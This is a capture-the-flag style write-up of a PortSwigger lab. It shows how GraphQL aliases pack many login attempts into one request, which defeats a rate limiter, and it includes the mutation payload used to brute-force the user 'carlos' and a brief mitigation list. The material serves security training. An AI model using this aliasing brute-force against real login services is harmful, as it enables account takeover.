# Lab 02 — Bypassing GraphQL brute force protections

> **Expert** · [Official lab](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)

**Entry point:** the login rate-limiter counts *requests*, not operations —
GraphQL **aliases** send thousands of logins in one request.

## Solution

1. Generate aliased login attempts (the lab provides a console script that
   builds one alias per candidate password):

```graphql
mutation {
  bruteforce0: login(input:{password:"123456", username:"carlos"}){token success}
  bruteforce1: login(input:{password:"password", username:"carlos"}){token success}
  ...
}
```

2. Send the single request — one response contains `success: true` for one
   alias — that's carlos's password.
3. Log in as carlos — lab solved.

## Mitigation

Rate-limit per account + per operation count; disable query aliasing
depth/complexity abuse; lock after N failed logins regardless of transport.
